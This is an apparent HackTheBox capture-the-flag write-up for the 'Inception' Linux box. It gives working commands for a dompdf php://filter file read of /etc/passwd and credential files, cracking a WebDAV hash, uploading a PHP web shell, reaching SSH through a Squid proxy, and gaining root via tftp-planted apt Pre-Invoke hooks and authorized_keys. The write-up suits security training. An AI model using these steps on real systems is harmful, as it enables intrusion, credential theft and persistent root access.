---
title: "Inception"
date: 2021-07-29 05:05:00 +0530
categories: [HackTheBox, Linux Machines]
tags: [linux, dompdf, lfi, webdav, squid, tftp, hackthebox]
image: /assets/img/Posts/Inception/Inception.png
---
# Enumeration
## Masscan + Nmap
```bash
$ masscan -p1-65535,U:1-65535 `IP` --rate=10000 -e tun0 | tee masscan.out
Discovered open port 3128/tcp on 10.10.10.67
Discovered open port 80/tcp on 10.10.10.67
```
Parse those ports to nmap:
```bash
ports=$(cat masscan.out |awk '{ print $4 }' | sed 's/\/tcp//;s/\/udp//' | tr '\n' ',' | sed 's/,$//')
nmap -v -sVC --min-rate 1000 -p $ports `IP` -oN nmap-fullscan.out
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Inception
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
```

## Apache Port 80
Directory brute forcing:
```bash
$ ffuf -u http://inception.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -e .txt,.php,.html -of md -o ffuf.out -fc 401,403,405
```

|FUZZ | URL | Redirectlocation | Position | Status Code | Content Length | Content Words | Content Lines | Content Type |
|--|--|--|--|--|--|--|--|--|
| images | http://inception.htb/images | http://inception.htb/images/ | 9 | 301 | 315 | 20 | 10 | text/html; charset=iso-8859-1 |
| index.html | http://inception.htb/index.html |  | 64 | 200 | 2877 | 124 | 1052 | text/html |
| LICENSE.txt | http://inception.htb/LICENSE.txt |  | 254 | 200 | 17128 | 2798 | 64 | text/plain |
| assets | http://inception.htb/assets | http://inception.htb/assets/ | 657 | 301 | 315 | 20 | 10 | text/html; charset=iso-8859-1 |  |
| . | http://inception.htb/. |  | 1597 | 200 | 2877 | 124 | 1052 | text/html |


 There's nothing much in any url.
 But index.html does have a lot of empty lines and at the end it contains the string:
 ```bash
$ curl http://inception.htb/


<!-- Todo: test dompdf on php 7.x -->
 ```
 
Visiting /dompdf gives:
```bash
****** Index of /dompdf ******
[[ICO]]       Name                         Last_modified    Size Description
============================================================================
[[PARENTDIR]] Parent_Directory                                -  
[[   ]]       CONTRIBUTING.md              2014-01-26 20:25 3.1K  
[[   ]]       LICENSE.LGPL                 2013-05-24 03:47  24K  
[[   ]]       README.md                    2014-02-07 03:30 4.8K  
[[   ]]       VERSION                      2014-02-07 06:35    5  
[[   ]]       composer.json                2014-02-02 08:33  559  
[[   ]]       dompdf.php                   2013-05-24 03:47 6.9K  
[[   ]]       dompdf_config.custom.inc.php 2013-11-07 04:45 1.2K  
[[   ]]       dompdf_config.inc.php        2017-11-06 02:21  13K  
[[DIR]]       include/                     2014-02-08 01:00    -  
[[DIR]]       lib/                         2014-02-08 01:00    -  
[[   ]]       load_font.php                2013-05-24 03:47 5.2K  
============================================================================
     Apache/2.4.18 (Ubuntu) Server at inception.htb Port 80
```
VERSION file says 0.6.0.

# Foothold
Running searchsploit on `dompdf 0.6.0` gives:
```bash
$ searchsploit dompdf 0.6.0
----------------------------------------------------------- ---------------------------------
 Exploit Title          							       |  Path
----------------------------------------------------------- ---------------------------------
dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read       | php/webapps/33004.txt
dompdf 0.6.0 beta1 - Remote File Inclusion  		       | php/webapps/14851.txt
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

**Let's try with the arbitrary file read.**
```bash
An arbitrary file read vulnerability is present on dompdf.php file that
allows remote or local attackers to read local files using a special
crafted argument. This vulnerability requires the configuration flag
DOMPDF_ENABLE_PHP to be enabled (which is disabled by default).

Using PHP protocol and wrappers it is possible to bypass the dompdf's
"chroot" protection (DOMPDF_CHROOT) which prevents dompdf from accessing
system files or other files on the webserver. Please note that the flag
DOMPDF_ENABLE_REMOTE needs to be enabled.

Command line interface:
php dompdf.php
php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>

Web interface:

http://example/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=<PATH_TO_THE_FILE>
```
So even if `DOMPDF_CHROOT` is set to any directory, we can access the whole file-system using php wrappers. Also `DOMPDF_ENABLE_REMOTE` is enabled which is required here. 

To get `/etc/passwd`, I used the below command. It fetches the url with `curl`, returns a PDF containing a `base64` encoded string having the file contents, which is then decoded: 
```bash
$ file='/etc/passwd';curl -s http://inception.htb/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=$file | strings -n 50 | awk -F'(' '{print $2}' | awk -F')' '{print $1}'  | base64 -d

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
cobb:x:1000:1000::/home/cobb:/bin/bash
```

I tried for Remote file Inclusion, but that didn't work for me. Also to execute php code on the application, I need the permissions but after fetching the config file `dompdf_config.inc.php`, it shows that php is disabled.
```bash
 * This is a security risk.  Set this option to false if you wish to process
 * untrusted documents.
 */
def("DOMPDF_ENABLE_PHP", false);
```

Tried fetching:
`/var/log/apache2/access.log` - Nothing returned.
`/var/log/apache/access.log` - Nothing returned.
`/proc/self/environ` - Nothing returned.
`/var/www/html/dompdf/dompdf_config.inc.php` - Contains username and password as `user:password`
`/etc/apache2/apache2.conf` - Gave output.
`/etc/apache2/conf-enabled/security.conf` - Gave output.
`/etc/squid/passwd` - Nothing returned.
`/etc/apache2/sites-enabled/000-default.conf` and `/etc/apache2/sites-available/000-default.conf` :
```bash
<VirtualHost *:80>

        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        Alias /webdav_test_inception /var/www/html/webdav_test_inception
        <Location /webdav_test_inception>
                Options FollowSymLinks
                DAV On
                AuthType Basic
                AuthName "webdav test credential"
                AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd
                Require valid-user
        </Location>
</VirtualHost>
```

This file mentions something about:
- Virtualhosting being done at port 80 by server-admin `webmaster@localhost`. 
- Webroot is `/var/www/html`
- webdav test credentials residing in ``/var/www/html/webdav_test_inception/webdav.passwd``

```bash
$ file='/var/www/html/webdav_test_inception/webdav.passwd';curl -s http://inception.htb/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=$file | strings -n 50 | awk -F'(' '{print $2}' | awk -F')' '{print $1}'  | base64 -d | grep -v '#'/inception.htb/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/r
webdav_tester:$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0
```

Cracking hash with `john`:
```bash
$ john hash -w:/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
babygurl69       (webdav_tester)
1g 0:00:00:00 DONE (2021-07-28 18:32) 3.333g/s 74880p/s 74880c/s 74880C/s mondragon..220190
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

I was adding `webmaster@localhost` to my /etc/hosts first as it said something of virtual-hosting; being dumb. (@localhost will always try to fetch local server)
I got hostname through `/etc/hosts` as `Inception`, I added `webmaster@inception` to my /etc/hosts. That made no change that's because there isn't any hostname defined as such webmaster@localhost is just the admin for webdav and not a host.

Accessing [http://inception.htb/webdav_test_inception](http://inception.htb/webdav_test_inception) prompted me for an authentication.
Giving username and password as `webdav_tester:babygurl69` works well.

But after logging in, it gives 403 forbidden message:
```bash
$ curl http://webdav_tester:babygurl69@inception.htb/webdav_test_inception/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /webdav_test_inception/
on this server.<br />
</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at inception.htb Port 80</address>
</body></html>
```

# Failed forbidden bypass with squid-proxy
This didn't work as there wasn't any forbidden rules in configuration `/etc/apache2/sites-available/000-default.conf`.
```bash
        <Location /webdav_test_inception>
                Options FollowSymLinks
                DAV On
                AuthType Basic
                AuthName "webdav test credential"
                AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd
                Require valid-user
        </Location>
```
Even though there weren't any allow or deny rules for IP's, I did try to bypass the forbidden page using the squid-proxy running on port 3128.
You can do this by:
- Edit –> Preferences –> Advanced –> Network –> Settings and then select “Manual proxy configuration” and enter proxy server IP address (10.10.10.67) and Port (3128) to be used for all protocol including SOCKSv5.
- You can try using foxy-proxy extension, here you can even specify a username and password for squid proxy. 
- Edit /etc/proxychains.conf and add `http 10.10.10.67 3128 webdav_tester babygurl69` then you can send requests as:
```bash
$ proxychains curl http://10.10.10.67/webdav_test_inception/
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-10.10.10.67:3128-<><>-10.10.10.67:80-<--denied
curl: (7) Couldn't connect to server
```
Which shows that even after proxy-ing traffic from squid, It wasn't able to access the server.
# WebDAV
If I check for OPTIONS allowed by `/webdav_test_inception/` it gives: `Allow: OPTIONS,GET,HEAD,POST,DELETE,TRACE,PROPFIND,PROPPATCH,COPY,MOVE,LOCK` and for a random page like `zzz` it gives `OPTIONS,MKCOL,PUT,LOCK`.
That clearly shows we can write files onto the server.

I can try something like `davtest` to upload several files with different extensions and check if the extension is executed:
```bash
$ davtest -auth webdav_tester:babygurl69 -sendbd auto -url http://inception.htb/webdav_test_inception/
PUT File: http://inception.htb/webdav_test_inception/DavTestDir_yY8ocCsJAt6/davtest_yY8ocCsJAt6.txt
PUT File: http://inception.htb/webdav_test_inception/DavTestDir_yY8ocCsJAt6/davtest_yY8ocCsJAt6.php
PUT File: http://inception.htb/webdav_test_inception/DavTestDir_yY8ocCsJAt6/davtest_yY8ocCsJAt6.asp
PUT File: http://inception.htb/webdav_test_inception/DavTestDir_yY8ocCsJAt6/davtest_yY8ocCsJAt6.jsp
PUT File: http://inception.htb/webdav_test_inception/DavTestDir_yY8ocCsJAt6/davtest_yY8ocCsJAt6.pl
PUT File: http://inception.htb/webdav_test_inception/DavTestDir_yY8ocCsJAt6/davtest_yY8ocCsJAt6.aspx
PUT File: http://inception.htb/webdav_test_inception/DavTestDir_yY8ocCsJAt6/davtest_yY8ocCsJAt6.cfm
PUT File: http://inception.htb/webdav_test_inception/DavTestDir_yY8ocCsJAt6/davtest_yY8ocCsJAt6.html
PUT File: http://inception.htb/webdav_test_inception/DavTestDir_yY8ocCsJAt6/davtest_yY8ocCsJAt6.cgi
PUT File: http://inception.htb/webdav_test_inception/DavTestDir_yY8ocCsJAt6/davtest_yY8ocCsJAt6.shtml
PUT File: http://inception.htb/webdav_test_inception/DavTestDir_yY8ocCsJAt6/davtest_yY8ocCsJAt6.jhtml
Executes: http://inception.htb/webdav_test_inception/DavTestDir_yY8ocCsJAt6/davtest_yY8ocCsJAt6.txt
Executes: http://inception.htb/webdav_test_inception/DavTestDir_yY8ocCsJAt6/davtest_yY8ocCsJAt6.php
Executes: http://inception.htb/webdav_test_inception/DavTestDir_yY8ocCsJAt6/davtest_yY8ocCsJAt6.html
PUT Shell: http://inception.htb/webdav_test_inception/DavTestDir_yY8ocCsJAt6/yY8ocCsJAt6_php_cmd.php
PUT Shell: http://inception.htb/webdav_test_inception/DavTestDir_yY8ocCsJAt6/yY8ocCsJAt6_php_backdoor.php
```
So I can upload any file and even execute php files.
If this wouldn't have worked, I would've tried for something like upload .txt files and then renaming it to .php.
I won't use the webshell `davtest` uploaded.

I can use something like `cadaver` to upload files:
```bash
$ cadaver http://inception.htb/webdav_test_inception/
Authentication required for webdav test credential on server `inception.htb':
Username: webdav_tester
Password:
dav:/webdav_test_inception/> put /opt/phprev.php
Uploading /opt/phprev.php to `/webdav_test_inception/phprev.php':
Progress: [=============================>] 100.0% of 3462 bytes succeeded.
```
or 
I made a file call shell.php with contents:
```php
<?php system($_GET['cmd']);?>
```
and then uploaded it to the server:
```bash
$ curl -XPUT -T ./shell.php http://inception.htb/webdav_test_inception/shell.php -u webdav_tester:babygurl69
****** 201 Created ******
Resource /webdav_test_inception/shell.php has been created.
===============================================================================
     Apache/2.4.18 (Ubuntu) Server at inception.htb Port 80

$ curl -u webdav_tester:babygurl69 http://inception.htb/webdav_test_inception/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This is a simple workaround I did as I wasn't able to spawn a reverse shell.
```bash
root@TheCaretaker:~/$ while read i; do curl -u webdav_tester:babygurl69 'http://inception.htb/webdav_test_inception/shell.php' -G --data-urlencode "cmd=$i"; echo -n '$ ';done
$ pwd
/var/www/html/webdav_test_inception
$ ls ..
LICENSE.txt
README.txt
assets
dompdf
images
index.html
latest.tar.gz
webdav_test_inception
wordpress_4.8.3

$ cat ../wordpress_4.8.3/wp-config.php | grep -v '\*'
<?php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'VwPddNh7xMZyDQoByQL4');
define('DB_HOST', 'localhost');
define('DB_CHARSET', 'utf8');
```

# SSH via squid proxy
So I have valid credentials, for MySQL but it isn't running on the host:
```bash
$ netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 :::3128                 :::*                    LISTEN      -
udp        0      0 0.0.0.0:38433           0.0.0.0:*                           -
udp6       0      0 :::45319                :::*                                -
```
But I see SSH running on the box. 
`cobb:VwPddNh7xMZyDQoByQL4` can be valid credentials for SSH, but maybe rules have been added to deny from other hosts. 

Let's add `http 10.10.10.67 3128` to /etc/proxychains as discussed above.
What it does is proxy our http traffic through port 3128 (which is running squid proxy server with http). Which will access SSH and forward our traffic through.
```bash
$ proxychains ssh cobb@127.0.0.1
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-10.10.10.67:3128-<><>-127.0.0.1:22-<><>-OK
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:dr5DOURssJH5i8VbjPxvbeM+e2FyMqJ8DGPB/Lcv1Mw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.
cobb@127.0.0.1's password:
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu Nov 30 20:06:16 2017 from 127.0.0.1
cobb@Inception:~$ ls
user.txt
cobb@Inception:~$ cat user.txt
4a8bc2d686d093f3f8ad1b37b191303c
cobb@Inception:~$
```
# Privesc
Checking for sudo permissions:
```bash
cobb@Inception:~$ sudo -l
[sudo] password for cobb:
Matching Defaults entries for cobb on Inception:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobb may run the following commands on Inception:
    (ALL : ALL) ALL
```
Getting root:
```bash
cobb@Inception:~$ sudo su
root@Inception:/home/cobb# cd
root@Inception:~# ls
root.txt
root@Inception:~# cat root.txt
You're waiting for a train. A train that will take you far away. Wake up to find root.txt.
```

If I check for the IP for this box, it's `192.168.0.10` not the usual 10.10.10.0/24 subnet IP.
```bash 
root@Inception:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 00:16:3e:28:53:63 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 192.168.0.10/24 brd 192.168.0.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe28:5363/64 scope link
       valid_lft forever preferred_lft forever
```

Checking for any IP address resolved in ARP tables:
```bash
root@Inception:~# arp -a
? (192.168.0.1) at fe:8d:c6:c9:e5:81 [ether] on eth0
```

Downloading a `nmap` binary from [here](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) and running it on 192.168.0.1.
```bash
root@Inception:/home/cobb$ ./nmap 192.168.0.1 -n -v
Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-07-28 20:47 UTC
Not shown: 1202 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
53/tcp open  domain
MAC Address: FE:8D:C6:C9:E5:81 (Unknown)
```

I can try accessing ftp with anonymous credentials:
```bash
root@Inception:/home/cobb# ftp 192.168.0.1
Connected to 192.168.0.1.
220 (vsFTPd 3.0.3)
Name (192.168.0.1:cobb): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd
Access denied
ftp> ls
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Nov 30  2017 bin
drwxr-xr-x    3 0        0            4096 Nov 30  2017 boot
drwxr-xr-x   19 0        0            3920 Jul 27 10:28 dev
drwxr-xr-x   93 0        0            4096 Nov 30  2017 etc
drwxr-xr-x    2 0        0            4096 Nov 06  2017 home
lrwxrwxrwx    1 0        0              33 Nov 30  2017 initrd.img -> boot/initrd.img-4.4.0-101-generic
lrwxrwxrwx    1 0        0              32 Nov 06  2017 initrd.img.old -> boot/initrd.img-4.4.0-98-generic
drwxr-xr-x   22 0        0            4096 Nov 30  2017 lib
drwxr-xr-x    2 0        0            4096 Oct 30  2017 lib64
drwx------    2 0        0           16384 Oct 30  2017 lost+found
drwxr-xr-x    3 0        0            4096 Oct 30  2017 media
drwxr-xr-x    2 0        0            4096 Aug 01  2017 mnt
drwxr-xr-x    2 0        0            4096 Aug 01  2017 opt
dr-xr-xr-x  206 0        0               0 Jul 27 10:27 proc
drwx------    6 0        0            4096 Nov 08  2017 root
drwxr-xr-x   26 0        0             940 Jul 28 06:25 run
drwxr-xr-x    2 0        0           12288 Nov 30  2017 sbin
drwxr-xr-x    2 0        0            4096 Apr 29  2017 snap
drwxr-xr-x    3 0        0            4096 Nov 06  2017 srv
dr-xr-xr-x   13 0        0               0 Jul 27 10:28 sys
drwxrwxrwt   10 0        0            4096 Jul 28 20:50 tmp
drwxr-xr-x   10 0        0            4096 Oct 30  2017 usr
drwxr-xr-x   13 0        0            4096 Oct 30  2017 var
lrwxrwxrwx    1 0        0              30 Nov 30  2017 vmlinuz -> boot/vmlinuz-4.4.0-101-generic
lrwxrwxrwx    1 0        0              29 Nov 06  2017 vmlinuz.old -> boot/vmlinuz-4.4.0-98-generic
226 Directory send OK.
```

Checking for any crontabs running on the system:
```bash
ftp> cd etc
250 Directory successfully changed.
ftp> get crontab
local: crontab remote: crontab
200 PORT command successful. Consider using PASV.
exit
root@Inception:/home/cobb$ cat crontab
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *   * * *   root    apt update 2>&1 >/var/log/apt/custom.log
30 23   * * *   root    apt upgrade -y 2>&1 >/dev/null
```

Getting that /var/log/apt/custom.log:
```bash
Err:1 http://security.ubuntu.com/ubuntu xenial-security InRelease
  Temporary failure resolving 'security.ubuntu.com'
Err:2 http://us.archive.ubuntu.com/ubuntu xenial InRelease
  Temporary failure resolving 'us.archive.ubuntu.com'
```

So, If I update the /etc/hosts file and add security.ubuntu.com as `192.168.0.10`, as the crontab runs root will try to update using my host and I can provide a malicious host.
But I don't seem to have write perms to hosts file.

I can try changing the config files for apt. They reside in /etc/apt:
```bash
ftp> cd etc
250 Directory successfully changed.
ftp> cd apt
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Nov 30  2017 apt.conf.d
drwxr-xr-x    2 0        0            4096 Apr 14  2016 preferences.d
-rw-r--r--    1 0        0            3021 Oct 30  2017 sources.list
drwxr-xr-x    2 0        0            4096 Apr 14  2016 sources.list.d
-rw-r--r--    1 0        0               0 Oct 30  2017 sources.list~
-rw-r--r--    1 0        0           12255 Aug 01  2017 trusted.gpg
drwxr-xr-x    2 0        0            4096 Apr 14  2016 trusted.gpg.d
```

Let's see what's in /etc/apt/apt.conf.d
```bash
ftp> cd apt.conf.d
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              82 Oct 30  2017 00CDMountPoint
-rw-r--r--    1 0        0              49 Oct 30  2017 00aptitude
-rw-r--r--    1 0        0              40 Oct 30  2017 00trustcdrom
-rw-r--r--    1 0        0              42 Apr 14  2016 01-vendor-ubuntu
-rw-r--r--    1 0        0             769 Apr 14  2016 01autoremove
-r--r--r--    1 0        0            3459 Nov 30  2017 01autoremove-kernels
-rw-r--r--    1 0        0             129 May 24  2016 10periodic
-rw-r--r--    1 0        0             108 May 24  2016 15update-stamp
-rw-r--r--    1 0        0              85 May 24  2016 20archive
-rw-r--r--    1 0        0            2656 Oct 30  2017 50unattended-upgrades
-rw-r--r--    1 0        0             182 Nov 10  2015 70debconf
-rw-r--r--    1 0        0             305 May 24  2016 99update-notifier
ftp> get 00aptitude
local: 00aptitude remote: 00aptitude
```
Let's get 00aptitude
```bash
root@Inception:/home/cobb# cat 00aptitude
Aptitude::Get-Root-Command "sudo:/usr/bin/sudo";
```

If I modify it and try to upload it's still not uploading even though, I have write permissions.
If I check for ftp configurations I get `/etc/default/tftpd-hpa`, which says create options are configured for tftp.
```bash
# /etc/default/tftpd-hpa

TFTP_USERNAME="root"
TFTP_DIRECTORY="/"
TFTP_ADDRESS=":69"
TFTP_OPTIONS="--secure --create"
```
and uploading now does work with tftp.

Googling `apt conf execute command` gives this [link]() at the top.

To get the flag and test for cronjob running, I made a file named test. 
```bash
APT::Update::Pre-Invoke {"cp /root/root.txt /tmp/root.txt; chmod 666 /tmp/root.txt"};
```
Put it to /etc/apt/apt.conf.d using tftp:
```bash
$ tftp 192.168.0.1
tftp> put test /etc/apt/apt.conf.d/test
Sent 87 bytes in 0.0 seconds
```

I can also get root shell by putting authorized_keys at .ssh folder as we already saw SSH port is open on 192.168.0.1.
```bash
$ ssh-keygen
$ echo 'APT::Update::Pre-Invoke {"chmod 600 /root/.ssh/authorized_keys"};' > caretaker
$ tftp 192.168.0.1
tftp> put caretaker /etc/apt/apt.conf.d/caretaker
Sent 67 bytes in 0.0 seconds
tftp> put .ssh/id_rsa.pub /root/.ssh/authorized_keys
Sent 397 bytes in 0.0 seconds
```

Then I can just login as root:
```bash
cobb@Inception:~$ ssh root@192.168.0.1
The authenticity of host '192.168.0.1 (192.168.0.1)' can't be established.
ECDSA key fingerprint is SHA256:zj8NiAd9po8KKA/z7MGKjn7j6wPFpA2Y6bDTRecUrdE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.0.1' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)
Last login: Thu Nov 30 20:04:21 2017

root@Inception:~# ifconfig eth0 | grep inet
          inet addr:10.10.10.67  
```
# Beyond root
I could've also revealed all internal ports with squid via the same way I logged into SSH.
Add `http 10.10.10.67 3128` to proxy.conf.

Run nmap with proxychains and it'll give all the internal ports not accessible:
```bash
$ proxychains nmap -n -sCV -sT 10.10.10.67 -p- -v 2>/dev/null
ProxyChains-3.1 (http://proxychains.sf.net)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 93:ad:d8:31:eb:db:c3:30:8e:96:c4:60:82:8b:4f:c4 (RSA)
|   256 1e:a8:07:32:25:c2:f9:a7:65:98:0e:52:15:3d:96:f7 (ECDSA)
|_  256 37:1d:45:db:f6:b1:2a:92:50:13:69:de:77:a4:ef:ae (ED25519)
80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Inception
3128/tcp open  http-proxy Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
